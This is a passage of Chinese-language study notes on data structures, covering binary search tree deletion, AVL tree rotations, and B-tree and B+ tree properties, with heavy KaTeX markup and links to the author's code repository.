stretchy="false">{</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>C</mi><mi>L</mi></msub><mi>C</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>Q</mi><mi>L</mi></msub><mi>Q</mi><msub><mi>S</mi><mi>L</mi></msub><mi>S</mi><mi>P</mi><msub><mi>P</mi><mi>R</mi></msub><mi>F</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{...C_LC...Q_LQS_LSPP_RF...\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mclose">}</span></span></span></span>为了保证中序遍历后，删去该元素仍然保持其他元素的相对位置不变，有两种做法</p><ol><li><p>让P的直接前驱S代替P</p><p>P的直接前驱S是PL中的最大值，即左子树中的最大值</p><p>f-&gt;lchild=s；s-&gt;rchild=PR;</p></li><li><p>让P的直接后继S代替P</p><p>p的直接后继S是PR中的最小值，即右子树中的最大值</p><p>f-&gt;rchild=s;  s-&gt;lchid=PL;</p></li></ol></li></ul></li><li><p>遍历</p><ul><li>中序遍历二叉排序树可以得到一个关键字的有序序列。这个是由二叉树的定义决定的</li></ul></li><li><p>性能分析：</p><p>查找成功的平均查找长度为：  <strong>Σ(本层高度*本层结点个数) / 结点总数</strong><br />查找不成功的平均查找长度为：   <strong>Σ(本层高度*本层补上的叶子结点个数) / 补上的叶子总数</strong></p><p>显然,含<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>个节点的二叉排序树的平均查找长度和树的形态有关。</p><ul><li><p>最坏的情况：当先后插入的关键字有序时，构造的二叉排序树蜕变为单支树。树的深度为n，ASL=(n+1)/2</p></li><li><p>最好的情况: 二叉排序树的形态和折半查找的判定树相同，其ASL与log2n成正比</p></li><li><p>平均性能:书上的公式推导<s>鼠鼠看不懂捏</s></p><p>结论就是<mark>在随机情况下，二叉排序树的ASL与logn是等数量级的</mark></p></li><li><p>ASL的手算</p></li></ul><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530195451186.png" class="" alt="image-20240530195451186" loading="lazy"></li><li><p>代码实现:用C++封装了一个类<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Search/binarySearchTree.cpp">DataStructuresAndAlgorithms/C/Search/binarySearchTree.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul><h4 id="平衡二叉树"><a class="markdownIt-Anchor" href="#平衡二叉树"></a> 平衡二叉树</h4><p><a href="https://www.bilibili.com/video/BV1tZ421q72h/?spm_id_from=333.337.search-card.all.click&amp;vd_source=2dd928d1666db052f11478fedb530519">平衡二叉树(AVL树)_哔哩哔哩_bilibili</a>讲的很清晰</p><p>可以发现二叉搜索树，在有序的情况下，会退化成顺序表，大幅降低搜索效率，由此平衡二叉树优化了这个问题</p><ul><li>概念:平衡二叉树(Balanced Binary Tree)又称AVL树。它或是一棵空树，或是具有下列性质的二叉树<ul><li><mark>它的左子树和右子树都是平衡二叉树</mark></li><li>左子树和右子树的深度之差的绝对值不超过1，定义该节点的平衡因子BF为该节点的左子树深度减去右子树的深度，取值范围为-1,0,1</li></ul></li></ul><p><mark>查找，插入，删除的过程和二叉搜索树是相同的，只不过失衡的时候需要调整</mark></p><ul><li><p>构造:简而言之，<mark>AVL树就是对二叉搜索树的生成过程进行调整后的树</mark>.</p><p>依次插入元素(按照二叉排序树的方式)，若出现不平衡，则要根据新插入的结点与最低不平衡结点的位置关系进行相应的调整。分为LL型、RR型、LR型和RL型4种类型</p><p><mark>构建调整</mark></p><p>两种操作：(原则:不改变中序遍历的序列)</p><ul><li>左旋:向左旋转，冲突的左孩变右孩</li><li>右旋:向右旋转，冲突的右孩变左孩</li></ul><p>4种情况对应的失衡调整策略:(书中讲的很详细，建议读一读)</p><ol><li><p><mark>LL型</mark></p><ul><li><p>失衡结点:BL=2</p></li><li><p>失衡结点左孩子:BL=1</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530213826973.png" class="" alt="image-20240530213826973" loading="lazy"><p><mark>对失衡的节点进行右旋</mark></p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530214334778.png" class="" alt="image-20240530214334778" loading="lazy"></li></ul></li><li><p><mark>RR型</mark></p><ul><li><p>失衡结点:BL=-2</p></li><li><p>失衡结点右孩子:BL=-1</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530214054472.png" class="" alt="image-20240530214054472" loading="lazy"><p>与LL型是对称的，<mark>对失衡的节点进行左旋</mark></p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530214244114.png" class="" alt="image-20240530214244114" loading="lazy"></li></ul></li><li><p><mark>LR型</mark></p><ul><li><p>失衡结点:BL=2</p></li><li><p>失衡结点左孩子:BL=-1</p></li></ul><p><mark>左旋左孩子，再右旋失衡结点</mark></p><p>左旋:</p><p>右旋:</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530215120247.png" class="" alt="image-20240530215120247" loading="lazy"></li><li><p><mark>RL型</mark></p><ul><li>失衡节点:BL=-2</li><li>失衡结点右孩子:BL=1</li></ul><p><mark>右旋右孩子，再左旋失衡节点</mark></p><p>右旋:</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530215534269.png" class="" alt="image-20240530215458928" loading="lazy"><p>左旋:</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530215615345.png" class="" alt="image-20240530215615345" loading="lazy"><p>记忆技巧：对于失衡结点:2对应L，-2对应R，对于孩子结点:1对应L,-1对应R</p><p>孩子结点是针对第一个L,R，如果第一个是L，则考虑左孩子</p><p><mark>在构建过程中：如果出现了多个节点失衡，只调整离插入节点最近的失衡结点即可保持平衡</mark></p></li></ol></li><li><p>删除</p><p><mark>删除调整</mark>如果出现了多个节点失衡，需要依次沿着祖先依次向上检查调整平衡性</p><p>调整策略如上</p></li><li><p>性能分析：时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>上述对二叉排序树和二叉平衡树的查找性能的讨论都是在等概率的前提下进行的</p><p>若查找概率不等，则类似静态树表的查找进行构造次优查找树可进一步提高效率</p></li><li><p>代码实现:用C++类进行了简单的封装<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Search/AVL.cpp">DataStructuresAndAlgorithms/C/Search/AVL.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul><h4 id="b-树"><a class="markdownIt-Anchor" href="#b-树"></a> B-树</h4><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530225715689.png" class="" alt="image-20240530225715689" loading="lazy"><ul><li><p>概念:B-树是一种<mark>多叉平衡查找树</mark>,在文件系统中很有用,减少了硬件访问次数，读取包含多个元素的节点的耗时和读取单个元素的节点耗时几乎相同，而硬盘访问一次很耗时,因此B树主要用作文件的索引</p></li><li><p><mark>性质</mark></p><ul><li><p><mark>平衡：所有叶节点在同一层</mark></p></li><li><p><mark>有序：节点内有序，且任意元素的左子树都小于它，右子树都大于它</mark>，</p></li><li><p><mark>多路</mark>一棵m阶的B-树，或是空树，或是满足下列特性的m叉树</p></li></ul><ol><li><p>树中的每个节点至多有m棵子树，节点内的关键字个数最多m-1</p></li><li><p>若根节点不是叶子节点，则至少有两棵子树</p></li><li><p>除根之外的所有非终端节点至少<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mi>m</mi><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil \frac{m}{2} \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>棵子树</p></li><li><p>所有的非终端节点中包含下列信息数据</p><p>（n,P0，K1，P1，K2，…，Kn，Pn），其中P为指向子树的指针，K为关键字,n为关键字的个数</p></li><li><p>所有的叶子节点都出现在同一层次,并且不带信息(可以看作是外部结点或查找失败的节点,为空节点)</p></li></ol><p>B树高度的计算</p><blockquote><p>B树的最小高度：</p><p>由于每个结点的子树最多为m，第一层1个结点，第二层m个结点，第三层m^2…</p><p>n≤(m-1)(1+m+m<sup>2+m</sup>3+…+m<sup>(h-1))=m</sup>h-1,</p><p>因此有==<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>≥</mo><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">h\ge{log_m(n+1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>==</p><p>B树的最大高度:</p><p>由于根结点最少1个关键字，其余非叶结点最少⌈m/2⌉-1个关键字，所以第一层1个结点，第二层2个结点，第三层2⌈m/2⌉个结点…第h+1层即叶结点层至少有2(⌈m/2⌉)^(h-1)个结点，由于叶结点有n+1个(查找失败个数)，所以n+1≥2(⌈m/2⌉)^(h-1)，</p><p>因此有==<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>≤</mo><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mrow><mo stretchy="false">⌈</mo><mfrac><mi>m</mi><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow></msub><mo stretchy="false">(</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mrow><annotation encoding="application/x-tex">h\le{log_{\lceil \frac{m}{2}\rceil}(\frac{n+1}{2})+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2661079999999998em;vertical-align:-0.4209999999999999em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34479999999999994em;"><span style="top:-2.8198000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">⌈</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6915428571428572em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mclose mtight">⌉</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4209999999999999em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span></span>==</p></blockquote></li><li><p>查找</p><ul><li><p>访问结点是在硬盘上进行的，而节点内的查找是在内存中进行的(这里略去外存的读写)具体而言,根据指针拿一个节点，是一次硬盘IO,根据关键字在节点内寻找目标是在内存中进行</p></li><li><p>查找过程:</p><ol><li>在B-树中找节点(磁盘中取节点)</li><li>在节点中找关键字(顺序查找or折半查找)</li></ol></li><li><p>性能分析</p><p><mark>在磁盘中查找的次数是决定B-树查找效率的首要因素</mark></p></li></ul></li><li><p>插入</p><p>课本P242有一个详细的过程</p><ul><li><p>先查找到插入的位置进行插入（插入位置一定在叶节点)</p></li><li><p>如果没有上溢出（节点内的关键字个数超过了m-1)，无需调整</p></li><li><p>否则中间元素<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mi>m</mi><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil\frac{m}{2}\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>上移，两边分裂(直到没有上溢出为止)</p></li></ul><p><strong>分裂的方法是</strong>：</p><p>插入key后从中间位置⌈m/2⌉把结点分为两部分，<strong>左部分放在这个原结点中，右部分放在新结点中，中间位置⌈m/2⌉的结点插入到原结点的父节点。</strong></p><p>若原结点的父节点因为⌈m/2⌉位置结点的插入导致必须分裂，继续重复上述操作即可。</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531100743519.png" class="" alt="image-20240531100743519" loading="lazy"></li><li><p>删除</p><p>复习一下B-树的性质</p><ul><li><p>m阶B-树的结点最少有</p><ol><li>根节点:2个分支，1个元素</li><li>其他节点:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mi>m</mi><mn>2</mn></mfrac><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil \frac{m}{2}\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span></span></span></span>个分支，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mfrac><mi>m</mi><mn>2</mn></mfrac><mo stretchy="false">⌉</mo><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lceil\frac{m}{2}\rceil-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mopen">⌈</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌉</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个元素</li></ol></li><li><p>删除非叶节点，为了保证有序性，需要拿直接前驱或者直接后继进行替换，即都转换成删除叶节点元素，然后把该节点替换为删除的叶节点元素</p></li><li><p>如果叶节点元素没有下溢出(节点内的关键字个数低于要求)就无需调整</p></li><li><p>如果下溢出（就是删除该节点后,节点内的关键字个数少于最低要求）</p><ul><li><p>兄弟够借,父亲节点下去，兄弟节点上来(保证有序性)</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531100922048.png" class="" alt="image-20240531100922048" loading="lazy"></li><li><p>兄弟不够借,跟兄弟节点合并，删除该节点，父亲节点下移与其兄弟节点合并</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531101122476.png" class="" alt="image-20240531101122476" loading="lazy"></li><li><p>直接删除关键字:删除后仍然满足B树定义</p></li></ul></li></ul></li><li><p>代码实现:一个简单的实现:<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms/blob/master/C/Search/BTree.cpp">DataStructuresAndAlgorithms/C/Search/BTree.cpp at master · OneLastChick/DataStructuresAndAlgorithms (github.com)</a></p></li></ul><h4 id="b树"><a class="markdownIt-Anchor" href="#b树"></a> B+树</h4><ul><li><p>概念:B+树是应文件系统（数据库)所需而出的一种B-树的变型树(严格来说已经不算树了)</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240531104747997.png" class="" alt="image-20240531104747997" loading="lazy"><p>一颗<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>阶的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>B</mi><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">B^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span></span></span></span>树的性质:</p><ol><li>有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>棵子树的节点含有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>个关键字</li><li>所有的叶子节点中包含了全部关键字的信息，以及指向含这些关键字记录的指针，且叶子节点本身依关键字的大小自小到大顺序连接</li><li>所有的非终端节点可以看成索引部分，节点中仅含有其子树中最大或最小的关键字</li></ol></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>树与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>B</mi><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">B^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin 